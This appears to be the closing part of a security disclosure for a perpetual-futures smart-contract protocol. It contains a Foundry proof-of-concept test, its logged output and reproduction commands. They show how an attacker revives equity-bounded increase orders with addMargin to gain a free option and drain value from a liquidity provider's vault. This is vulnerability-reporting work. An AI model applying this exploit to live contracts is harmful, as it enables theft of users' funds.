        for (uint256 k; k < ROUNDS; ++k) {
            m = _round(k, start + (k + 1) * 1 hours, m, mode, o);
        }
        _closeLots(start + 7 hours, _size(), m);
        require(_size() == 0, "flat");
        vm.prank(ATTACKER);
        acct.withdrawAll();
        o.attackerWallet = settlementToken.balanceOf(ATTACKER);
        o.victimValue = juniorVault.convertToAssets(juniorVault.balanceOf(LP_J));
        console2.log(
            string.concat(
                "     attacker wallet after withdrawing everything: ", _usd(o.attackerWallet), "; victim LP_J Junior value: ", _usd(o.victimValue)
            )
        );
    }

    function test_armedIncreaseIsKeeperProof_attackerWithdrawsLpFundsToWallet() public {
        console2.log(string.concat("setup: victim LP_J Junior ", _usd(juniorVault.convertToAssets(juniorVault.balanceOf(LP_J))), " USDG"));
        console2.log(
            string.concat("setup: attacker wallet ", _usd(FUND), " USDG, 750000 USDG LONG base, 3000000 USDG increase each hour; Pyth confidence 2 bps")
        );
        uint256 snap = vm.snapshotState();
        Outcome memory a = _run(Mode.Attack);
        vm.revertToState(snap);
        snap = vm.snapshotState();
        Outcome memory c = _run(Mode.Control);
        vm.revertToState(snap);
        Outcome memory b = _run(Mode.Baseline);

        int256 attackerNet = int256(a.attackerWallet) - int256(FUND);
        int256 controlNet = int256(c.attackerWallet) - int256(FUND);
        int256 victimVsBaseline = int256(a.victimValue) - int256(b.victimValue);
        int256 victimVsControl = int256(a.victimValue) - int256(c.victimValue);

        assertEq(a.killed, 4, "every keeper execution of an armed order kills it");
        assertEq(a.exercised, 2, "both favorable rounds the attacker sees first are revived");
        assertLe(a.keeperBounties, 4 * router.maxOpenOrderExecutionBountyAssets(), "a kill costs at most the bounty");
        assertGt(attackerNet, 0, "attacker ends with more USDG in its wallet");
        assertLt(controlNet, 0, "the same orders without the bound lose");
        assertLt(victimVsBaseline, 0, "the victim LP's Junior is worth less than with no increase orders");
        assertLt(victimVsControl, 0, "the victim LP's Junior is worth less than with the same orders");

        console2.log("");
        _row("account", "before", "after", "delta");
        _row("ATTACKER wallet", _usd(FUND), _usd(a.attackerWallet), _usdSigned(attackerNet));
        _row("VICTIM LP_J Junior value", _usd(b.victimValue), _usd(a.victimValue), _usdSigned(victimVsBaseline));
        console2.log("    (VICTIM before = its Junior value in the baseline over the same hours, base position only)");
        console2.log("");
        console2.log("IMPACT row: Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield (Critical)");
        console2.log(string.concat("IMPACT attacker net, withdrawn to its own wallet after 6 rounds: ", _usdSigned(attackerNet), " USDG"));
        console2.log(
            string.concat(
                "IMPACT victim LP_J Junior value vs the baseline: ", _usdSigned(victimVsBaseline), " USDG; vs the same orders without the bound: ", _usdSigned(victimVsControl), " USDG"
            )
        );
        console2.log(
            string.concat(
                "IMPACT keeper race: 4 of 4 keeper executions of an armed order killed it, 2 of them before any move; bounties paid for the 4 kills ",
                _usd(a.keeperBounties),
                " USDG"
            )
        );
        console2.log(string.concat("IMPACT the same 6 orders without the bound, keeper filling at commit + 1 s: ", _usdSigned(controlNet), " USDG"));
    }

    // Any move, any size, either bound: a keeper can only kill the armed order, and after addMargin the same order
    // fills at its pinned tick, above the moved mark.
    function testFuzz_keeperOnlyKills_ownerRevivesAtPinnedTick(uint256 moveBps, uint256 incLots, bool leverageBound) public {
        moveBps = bound(moveBps, 1, 60);
        incLots = bound(incLots, 10, 30_000); // 1,000 to 3,000,000 USDG notional at 1.00
        uint256 size = incLots * CfdTypes.SIZE_QUANTUM;
        uint256 margin = size / 1e12 / 200 + 2_000e6;
        uint256 t0 = vm.getBlockTimestamp() + 10 minutes;
        _openBase(t0);
        t0 += 1 hours;
        _at(t0);
        _live(1e8);
        OrderV3Types.OrderRequest memory r = _armedIncrease(size, margin);
        if (leverageBound) {
            r.bounds.maxPostLeverageBps = uint32(((BASE + size) / 1e12) * 10_000 / r.bounds.minPostPositionEquityAssets);
            r.bounds.minPostPositionEquityAssets = 0;
        }
        uint64 id = _commit(r);
        bytes[] memory pinned = _tick(1e8, t0 + 1);

        _at(t0 + 1);
        uint256 snap = vm.snapshotState();
        assertEq(uint256(_keeperExec(id, pinned)), uint256(OrderV3Types.TerminalReason.ConstraintViolation), "keeper kills");
        assertEq(_size(), BASE, "nothing opens for a keeper");
        vm.revertToState(snap);

        uint256 m1 = 1e8 * (10_000 - moveBps) / 10_000;
        _at(t0 + 2);
        _live(m1);
        _at(t0 + 3);
        uint256 costBefore = engine.positionEntryCostAssetAtoms(address(acct));
        assertEq(uint256(_exercise(id, pinned)), uint256(OrderV3Types.TerminalReason.Executed), "owner revives");
        uint256 fillPx = (engine.positionEntryCostAssetAtoms(address(acct)) - costBefore) / incLots;
        assertApproxEqAbs(fillPx, 1e8, 1e4, "fills within 1 bp of the pinned tick");
        assertGt(fillPx, m1, "fills above the moved mark");
    }
}
```

### Output

```
Ran 2 tests for test/poc/EquityBoundFreeOptionPoC.t.sol:EquityBoundFreeOptionPoC
[PASS] testFuzz_keeperOnlyKills_ownerRevivesAtPinnedTick(uint256,uint256,bool) (runs: 256, μ: 8406688, ~: 8405758)
[PASS] test_armedIncreaseIsKeeperProof_attackerWithdrawsLpFundsToWallet() (gas: 89469855)
Logs:
  setup: victim LP_J Junior 9999999.999999 USDG
  setup: attacker wallet 300000.000000 USDG, 750000 USDG LONG base, 3000000 USDG increase each hour; Pyth confidence 2 bps
  -- ATTACK: every increase armed with its own equity bound, revived by addMargin after a favorable move
       round 1 (adverse 30 bps): attacker does nothing; the keeper's execution at commit + 3 s: ConstraintViolation, nothing opens
       round 2 (favorable 30 bps): attacker calls addMargin and executes in one transaction: fills at 1.00295000 from its pinned tick 1.00300000 while the live mark is 0.99999100
       round 3 (adverse 30 bps): KEEPER executes first at commit + 1 s: ConstraintViolation, nothing opens
       round 4 (favorable 30 bps): KEEPER executes first at commit + 1 s: ConstraintViolation, nothing opens
       round 5 (favorable 30 bps): attacker calls addMargin and executes in one transaction: fills at 0.99993199 from its pinned tick 0.99998199 while the live mark is 0.99698204
       round 6 (adverse 30 bps): attacker does nothing; the keeper's execution at commit + 3 s: ConstraintViolation, nothing opens
       attacker wallet after withdrawing everything: 310617.435905; victim LP_J Junior value: 9986659.745361
  -- CONTROL: same orders, no bound, a keeper fills each at commit + 1 s
       round 1 (adverse 30 bps): keeper fills at the pinned tick at commit + 1 s, trader closes at the moved price
       round 2 (favorable 30 bps): keeper fills at the pinned tick at commit + 1 s, trader closes at the moved price
       round 3 (adverse 30 bps): keeper fills at the pinned tick at commit + 1 s, trader closes at the moved price
       round 4 (favorable 30 bps): keeper fills at the pinned tick at commit + 1 s, trader closes at the moved price
       round 5 (favorable 30 bps): keeper fills at the pinned tick at commit + 1 s, trader closes at the moved price
       round 6 (adverse 30 bps): keeper fills at the pinned tick at commit + 1 s, trader closes at the moved price
       attacker wallet after withdrawing everything: 281740.658078; victim LP_J Junior value: 10010735.785258
  -- BASELINE: base position only
       attacker wallet after withdrawing everything: 299342.937246; victim LP_J Junior value: 10000338.092580
      account                       before                after                 delta
      ATTACKER wallet               300000.000000         310617.435905         +10617.435905
      VICTIM LP_J Junior value      10000338.092580       9986659.745361        -13678.347219
      (VICTIM before = its Junior value in the baseline over the same hours, base position only)
  IMPACT row: Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield (Critical)
  IMPACT attacker net, withdrawn to its own wallet after 6 rounds: +10617.435905 USDG
  IMPACT victim LP_J Junior value vs the baseline: -13678.347219 USDG; vs the same orders without the bound: -24076.039897 USDG
  IMPACT keeper race: 4 of 4 keeper executions of an armed order killed it, 2 of them before any move; bounties paid for the 4 kills 0.800000 USDG
  IMPACT the same 6 orders without the bound, keeper filling at commit + 1 s: -18259.341922 USDG

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 1.57s (1.81s CPU time)

Ran 1 test suite in 1.57s (1.57s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```

The attacker's wallet ends at 310,617.435905 USDG from 300,000.000000 USDG, +10,617.435905 USDG, and victim LP_J's Junior is worth 13,678.347219 USDG less than with no increase orders.

### Other files in the gist

- `output.log`: the complete `-vv` output of the command above, run in a fresh export of a82d4fef with only `EquityBoundFreeOptionPoC.t.sol` added. The Output section above is its test output. The lines before it are compiler warnings, with the local path shown as `<repo>`.
- `FB_EquityBoundOption.t.sol` and `FB_CloseFormOption.t.sol` test the same lever on a six-feed fixture with the release configuration (`SixFeedProofBase.sol` over `SixFeedBase.sol`). `FB_EquityBoundOption` runs the six rounds at 30 bps and at 8 bps, and fuzzes both bounds. `FB_CloseFormOption` applies the lever to armed partial closes on a hedged pair. Their outputs are `FB_EquityBoundOption.output.log` and `FB_CloseFormOption.output.log`, recorded with the two commands below in a fresh a82d4fef export with only these four files added. These files compile without via-IR. Commands, from the repo root at a82d4fef:

```bash
mkdir -p packages/perps/test/hunt3 packages/perps/test/vuln/harness && cp FB_EquityBoundOption.t.sol FB_CloseFormOption.t.sol packages/perps/test/hunt3/ && cp SixFeedProofBase.sol SixFeedBase.sol packages/perps/test/vuln/harness/ && cd packages/perps
FOUNDRY_VIA_IR=false FOUNDRY_OPTIMIZER=false forge test --skip 'test/perps/**' --skip 'test/fixtures/**' --skip 'script/**' --match-path test/hunt3/FB_EquityBoundOption.t.sol -vv
FOUNDRY_VIA_IR=false FOUNDRY_OPTIMIZER=false forge test --skip 'test/perps/**' --skip 'test/fixtures/**' --skip 'script/**' --match-contract FB_CloseFormOption --match-test closeForm -vv
```
